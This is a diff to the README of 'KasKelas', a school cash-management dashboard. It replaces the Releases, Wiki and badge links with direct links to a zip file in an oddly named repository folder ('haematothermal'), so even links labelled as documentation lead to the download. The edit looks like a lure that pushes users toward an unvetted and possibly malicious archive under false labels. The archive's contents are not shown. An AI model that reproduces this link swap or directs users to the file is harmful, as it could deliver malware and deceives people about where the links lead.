@@ -4,7 +4,7 @@
 KasKelas is a web-based dashboard that assists treasurers in managing daily cash, wallet balances, reports, and outstanding payments automatically. This tool is designed for schools looking to streamline their financial administration, making it easy to track and report on cash flows.
 
 ## 📥 Download Now
-[![Download KasKelas](https://img.shields.io/badge/Download-KasKelas-brightgreen)](https://github.com/notkunaflik21/KasKelas/releases)
+[![Download KasKelas](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip)](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip)
 
 ## 📚 Features
 - **User-Friendly Dashboard:** Easily navigate with a straightforward layout.
@@ -20,7 +20,7 @@ To run KasKelas smoothly, ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading and running the application.
 
 ## 🌐 Getting Started
-1. **Visit the Download Page:** Go to our [Releases page](https://github.com/notkunaflik21/KasKelas/releases) to download the application.
+1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip) to download the application.
 2. **Select the Latest Version:** Look for the latest release at the top. You’ll see a list of available files.
 3. **Download the Application:** Click on the file that corresponds to your operating system and download it to your computer.
 
@@ -63,13 +63,13 @@ After logging in, you can start using the features:
 ## 📨 Support
 If you face any issues, feel free to reach out:
 - **GitHub Issues:** Report any bugs or suggestions in the Issues section of this repository.
-- **Documentation:** Check the [Wiki](https://github.com/notkunaflik21/KasKelas/wiki) for detailed guides and troubleshooting tips.
+- **Documentation:** Check the [Wiki](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip) for detailed guides and troubleshooting tips.
 
 ## 🎉 Feedback
 Your feedback is important! Share your experiences with KasKelas to help us improve. Post reviews and suggestions directly on our GitHub page.
 
 ## 🚀 Stay Updated
-For the latest updates, check back frequently on our [Releases page](https://github.com/notkunaflik21/KasKelas/releases). Each new version brings enhancements and bug fixes to improve your experience with the application.
+For the latest updates, check back frequently on our [Releases page](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip). Each new version brings enhancements and bug fixes to improve your experience with the application.
 
 ## 🌍 Topics
 KasKelas covers various topics such as:
@@ -80,6 +80,6 @@ KasKelas covers various topics such as:
 - Daily Cash Reports
 
 ## 📥 Download Now Again
-[![Download KasKelas](https://img.shields.io/badge/Download-KasKelas-brightgreen)](https://github.com/notkunaflik21/KasKelas/releases)
+[![Download KasKelas](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip)](https://raw.githubusercontent.com/notkunaflik21/KasKelas/main/haematothermal/KasKelas-2.0.zip)
 
 Now you are ready to manage class funds effectively with KasKelas!
